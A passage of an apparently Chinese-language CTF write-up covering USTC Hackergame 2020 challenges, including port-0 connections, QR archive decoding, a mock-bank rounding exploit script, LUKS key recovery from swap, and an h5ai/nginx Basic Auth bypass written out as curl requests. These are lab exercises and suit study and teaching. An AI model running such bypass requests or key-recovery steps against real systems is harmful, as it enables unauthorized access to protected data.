8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server 